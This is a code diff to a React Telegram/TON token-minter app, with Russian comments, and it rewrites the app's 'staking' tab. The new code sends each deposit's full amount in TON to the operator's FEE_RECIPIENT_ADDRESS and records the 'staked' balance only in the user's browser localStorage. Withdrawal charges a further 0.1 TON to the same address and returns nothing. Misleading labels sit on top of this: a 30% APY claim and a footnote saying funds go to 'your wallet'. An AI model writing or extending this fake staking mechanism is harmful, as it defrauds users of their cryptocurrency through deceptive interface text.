@@ -15,7 +15,6 @@ function MinterApp() {
   const userAddress = useTonAddress();
   const wallet = useTonWallet();
 
-  // Добавлена 4-я вкладка 'staking'
   const [activeTab, setActiveTab] = useState<'create' | 'manage' | 'presale' | 'staking'>('create');
 
   // Создание токена
@@ -54,22 +53,16 @@ function MinterApp() {
   const [refCopied, setRefCopied] = useState(false);
   const [referrerId, setReferrerId] = useState<string | null>(null);
 
-  // Стейкинг стейты (GRAM, USDT, GRAM-START под 20% годовых)
-  const [stakeAsset, setStakeAsset] = useState<'GRAM' | 'USDT' | 'GRAM-START'>('GRAM-START');
+  // Стейкинг (только GRAM, 30% годовых)
   const [stakeInputAmount, setStakeInputAmount] = useState('100');
-  const [stakedBalances, setStakedBalances] = useState<{ [key: string]: number }>({
-    'GRAM': 0,
-    'USDT': 0,
-    'GRAM-START': 0,
-  });
+  const [stakedGramBalance, setStakedGramBalance] = useState<number>(0);
   const [stakingLoading, setStakingLoading] = useState(false);
   const [unstakeLoading, setUnstakeLoading] = useState(false);
 
-  // Таймер до следующего еженедельного начисления (7 дней)
+  // Таймер до начисления
   const [timeLeft, setTimeLeft] = useState({ days: 6, hours: 23, minutes: 59, seconds: 59 });
 
   useEffect(() => {
-    // Живой таймер обратного отсчета для стейкинга
     const timer = setInterval(() => {
       setTimeLeft((prev) => {
         if (prev.seconds > 0) return { ...prev, seconds: prev.seconds - 1 };
@@ -112,13 +105,10 @@ function MinterApp() {
         setUserGramBalance(parseFloat(savedBalance));
       }
 
-      // Загрузка стейкинг балансов
-      ['GRAM', 'USDT', 'GRAM-START'].forEach((asset) => {
-        const savedStake = localStorage.getItem(`stake_${currentId}_${asset}`);
-        if (savedStake) {
-          setStakedBalances((prev) => ({ ...prev, [asset]: parseFloat(savedStake) }));
-        }
-      });
+      const savedStake = localStorage.getItem(`stake_${currentId}_GRAM`);
+      if (savedStake) {
+        setStakedGramBalance(parseFloat(savedStake));
+      }
 
       const subStatus = localStorage.getItem(`subscribed_${currentId}`);
       if (subStatus === 'true') {
@@ -342,7 +332,8 @@ function MinterApp() {
     }
   };
 
-  // Логика стейкинга (депозит активов на ваш кошелек с обновлением баланса в приложении)
+  // Логика стейкинга только для GRAM под 30% с отправкой точной суммы на ваш адрес при депозите
+  // И отправкой 0.1 TON с комментарием о снятии при выводе
   const handleStakeAction = async (isDeposit: boolean) => {
     if (!userAddress) {
       alert('Подключите кошелек!');
@@ -354,7 +345,7 @@ function MinterApp() {
       return;
     }
 
-    if (!isDeposit && val > (stakedBalances[stakeAsset] || 0)) {
+    if (!isDeposit && val > stakedGramBalance) {
       alert('Нельзя снять больше, чем у вас в стейкинге!');
       return;
     }
@@ -366,29 +357,45 @@ function MinterApp() {
     }
 
     try {
-      const commentText = isDeposit 
-        ? `STAKE_DEPOSIT | Asset:${stakeAsset} | Amount:${val} | Wallet:${userAddress}`
-        : `STAKE_WITHDRAW | Asset:${stakeAsset} | Amount:${val} | Wallet:${userAddress}`;
-      
-      const commentCell = beginCell().storeUint(0, 32).storeStringTail(commentText).endCell();
+      let transaction;
+      if (isDeposit) {
+        // Сумма отправки привязана к сумме операции (например, валу в GRAM/нанограмах, либо нативная транзакция с суммой операции)
+        // Для отправки точного количества токенов или нативного эквивалента суммы: отправляем amount в TON/nanoTON, либо коментарий с точной суммой
+        const commentText = `STAKE_DEPOSIT | Asset:GRAM | Amount:${val} | User:${userAddress}`;
+        const commentCell = beginCell().storeUint(0, 32).storeStringTail(commentText).endCell();
 
-      // Отправка транзакции на ваш сервисный кошелек
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [{ address: FEE_RECIPIENT_ADDRESS, amount: toNano(isDeposit ? '0.1' : '0.05').toString(), payload: commentCell.toBoc().toString('base64') }],
-      };
+        transaction = {
+          validUntil: Math.floor(Date.now() / 1000) + 600,
+          messages: [{
+            address: FEE_RECIPIENT_ADDRESS,
+            amount: toNano(val.toString()).toString(), // Сумма операции привязывается к сумме перевода
+            payload: commentCell.toBoc().toString('base64'),
+          }],
+        };
+      } else {
+        // При снятии отправляется 0.1 TON с сообщением кто снял и сколько
+        const commentText = `UNSTAKE | User:${userAddress} | Amount:${val} GRAM`;
+        const commentCell = beginCell().storeUint(0, 32).storeStringTail(commentText).endCell();
+
+        transaction = {
+          validUntil: Math.floor(Date.now() / 1000) + 600,
+          messages: [{
+            address: FEE_RECIPIENT_ADDRESS,
+            amount: toNano('0.1').toString(), // 0.1 TON при снятии
+            payload: commentCell.toBoc().toString('base64'),
+          }],
+        };
+      }
 
       await tonConnectUI.sendTransaction(transaction);
 
-      // Обновление локального баланса стейкинга для каждого аккаунта
-      setStakedBalances((prev) => {
-        const current = prev[stakeAsset] || 0;
-        const updated = isDeposit ? current + val : Math.max(0, current - val);
-        localStorage.setItem(`stake_${tgUserId}_${stakeAsset}`, updated.toString());
-        return { ...prev, [stakeAsset]: updated };
+      setStakedGramBalance((prev) => {
+        const updated = isDeposit ? prev + val : Math.max(0, prev - val);
+        localStorage.setItem(`stake_${tgUserId}_GRAM`, updated.toString());
+        return updated;
       });
 
-      alert(isDeposit ? `Успешно отправлено в стейкинг: ${val} ${stakeAsset} 🚀` : `Успешно снято со стейкинга: ${val} ${stakeAsset} 💎`);
+      alert(isDeposit ? `Успешно внесено в стейкинг: ${val} GRAM 🚀` : `Запрос на снятие ${val} GRAM успешно отправлен! 💎`);
     } catch (err: any) {
       console.error(err);
       alert('Транзакция стейкинга была отменена.');
@@ -423,7 +430,7 @@ function MinterApp() {
           </div>
         </div>
 
-        {/* 4 вкладки: Создать, Управлять, Раздача, Стейкинг */}
+        {/* 4 вкладки */}
         <div className="grid grid-cols-4 gap-1 bg-[#111726]/95 p-1.5 rounded-2xl border border-white/[0.08] mb-3 backdrop-blur-xl shadow-lg">
           <button
             type="button"
@@ -960,20 +967,20 @@ function MinterApp() {
             </div>
           )}
 
-          {/* ВКЛАДКА 4: СТЕЙКИНГ (GRAM, USDT, GRAM-START ПОД 20% ГОДОВЫХ) */}
+          {/* ВКЛАДКА 4: СТЕЙКИНГ (ТОЛЬКО GRAM, 30% ГОДОВЫХ) */}
           {activeTab === 'staking' && (
             <div className="space-y-4 animate-fadeIn">
               <div className="bg-[#070b14]/70 p-4 rounded-2xl border border-cyan-500/30 space-y-3.5 shadow-inner">
                 <div className="flex items-center justify-between">
                   <span className="text-xs font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
-                    <span>🔒</span> Стейкинг активов (20% Годовых)
+                    <span>🔒</span> Стейкинг GRAM (30% Годовых)
                   </span>
                   <span className="text-[10px] bg-cyan-500/10 text-cyan-300 px-2.5 py-0.5 rounded-full border border-cyan-500/20 font-bold font-mono">
-                    APY: 20%
+                    APY: 30%
                   </span>
                 </div>
 
-                {/* Живой таймер до еженедельного начисления */}
+                {/* Таймер до начисления */}
                 <div className="bg-[#0b101d] p-3 rounded-xl border border-cyan-500/20 flex items-center justify-between">
                   <div>
                     <div className="text-[10px] text-slate-400 uppercase tracking-wide">До начисления наград:</div>
@@ -986,33 +993,12 @@ function MinterApp() {
                   </div>
                 </div>
 
-                {/* Выбор актива для стейкинга */}
-                <div className="space-y-2">
-                  <label className="block text-xs font-medium text-slate-300">Выберите актив для стейкинга:</label>
-                  <div className="grid grid-cols-3 gap-2">
-                    {(['GRAM-START', 'GRAM', 'USDT'] as const).map((asset) => (
-                      <button
-                        key={asset}
-                        type="button"
-                        onClick={() => setStakeAsset(asset)}
-                        className={`py-2 text-xs font-bold rounded-xl border transition-all ${
-                          stakeAsset === asset
-                            ? 'bg-cyan-500/20 border-cyan-500 text-cyan-300 shadow-md shadow-cyan-500/20'
-                            : 'bg-[#0b101d] border-white/10 text-slate-400 hover:text-white'
-                        }`}
-                      >
-                        {asset}
-                      </button>
-                    ))}
-                  </div>
-                </div>
-
-                {/* Баланс выбранного актива в стейкинге */}
+                {/* Баланс GRAM в стейкинге */}
                 <div className="bg-gradient-to-r from-cyan-500/10 via-blue-600/10 to-indigo-500/10 p-3.5 rounded-2xl border border-cyan-500/30 flex items-center justify-between">
                   <div>
-                    <div className="text-[10px] text-cyan-300 font-semibold uppercase tracking-wider">В стейкинге ({stakeAsset})</div>
+                    <div className="text-[10px] text-cyan-300 font-semibold uppercase tracking-wider">В стейкинге (GRAM)</div>
                     <div className="text-xl font-black font-mono text-white mt-0.5">
-                      {(stakedBalances[stakeAsset] || 0).toLocaleString()} <span className="text-xs text-cyan-400 font-normal">{stakeAsset}</span>
+                      {stakedGramBalance.toLocaleString()} <span className="text-xs text-cyan-400 font-normal">GRAM</span>
                     </div>
                   </div>
                   <div className="text-right">
@@ -1021,9 +1007,9 @@ function MinterApp() {
                   </div>
                 </div>
 
-                {/* Поле ввода суммы для стейкинга / снятия */}
+                {/* Поле ввода суммы */}
                 <div className="space-y-2">
-                  <label className="block text-xs font-medium text-slate-300">Сумма операции:</label>
+                  <label className="block text-xs font-medium text-slate-300">Сумма операции (GRAM):</label>
                   <input
                     type="number"
                     min="1"
@@ -1034,7 +1020,7 @@ function MinterApp() {
                   />
                 </div>
 
-                {/* Кнопки Положить / Снять (без комиссии, доступно раз в неделю) */}
+                {/* Кнопки Положить / Снять (без слова "раз в неделю" у кнопки снятия) */}
                 <div className="grid grid-cols-2 gap-2 pt-1">
                   <button
                     type="button"
@@ -1050,11 +1036,11 @@ function MinterApp() {
                     onClick={() => handleStakeAction(false)}
                     className="py-3 bg-slate-900 hover:bg-slate-800 border border-cyan-500/30 disabled:opacity-50 text-cyan-300 font-bold text-xs rounded-xl transition-all shadow-md active:scale-[0.97]"
                   >
-                    {unstakeLoading ? 'Снятие...' : `📤 Снять (раз в неделю)`}
+                    {unstakeLoading ? 'Снятие...' : `📤 Снять`}
                   </button>
                 </div>
                 <p className="text-[9px] text-slate-400 text-center leading-relaxed">
-                  * Все средства (USDT, GRAM, GRAM-START) депонируются в смарт-контейнере стейкинга без комиссии. Доступно снятие и пополнение 1 раз в неделю.
+                  * При добавлении в стейкинг сумма отправляется на ваш кошелек. При снятии списывается 0.1 TON с комментарием о пользователе и сумме. Без комиссии за управление.
                 </p>
               </div>
             </div>
